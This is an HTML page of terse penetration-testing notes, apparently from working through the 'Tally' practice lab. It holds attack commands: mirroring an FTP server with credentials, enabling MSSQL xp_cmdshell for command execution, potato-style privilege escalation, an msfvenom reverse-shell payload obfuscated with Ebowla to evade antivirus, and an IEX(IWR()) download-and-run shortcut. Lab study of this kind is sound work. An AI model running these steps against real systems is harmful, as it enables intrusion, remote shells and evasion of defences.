<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Tally - Sharepoint FTP MSSQL SeImpersonate</title>
</head><body>sharepoint<br/>
SecLists WebContent Discovery Sharepoint<br/>
<br/>
wget --mirror 'ftp://&lt;USER&gt;:&lt;PASS&gt;@host'&#09;&#09;#download every file from the FTP server<br/>
<br/>
EXEC SP_CONFIGURE 'show advanced options', 1<br/>
reconfigure<br/>
go<br/>
EXEC SP_CONFIGURE 'xp_cmdshell', 1<br/>
reconfigure<br/>
go<br/>
<br/>
xp_cmdshell "whoami"<br/>
go<br/>
<br/>
RottenPotato using lonelypotato: https://github.com/decoder-it/lonelypotato<br/>
Looks like lonelypotato needs another executable (will spawn that process as elevated)<br/>
<br/>
Ebowla execution encryption / obfuscation<br/>
Uses environment variables of target as decryption values = payload containment<br/>
Edit genetic.config to ensure your custom variables are all correct<br/>
msfvenom -p windows/x64/reverse_shell_tcp LHOST=&lt;&gt; LPORT=&lt;&gt; -f exe -o out.exe<br/>
python ebowla.py out.exe genetic.config<br/>
<br/>
IppSec used a GO type payload, so now let's build it<br/>
./build_x64go.sh output/go_symmetric_out.exe.go final_out.exe<br/>
<br/>
Another reminder to set mode to binary when PUTting files in FTP<br/>
<br/>
IEX(IWR()<br/>
Powershell cmdlet for Invoke-WebRequest, nifty shortcut<br/>
<br/>
Another method to detect 64 bit process (powershell only):<br/>
[Environment]::Is64BitProcess<br/>
<br/>
Can probably do the same with Is32BitProcess<br/>
<br/>
Ensure you are in an 'interactive' process to execute some programs/exploits</body></html>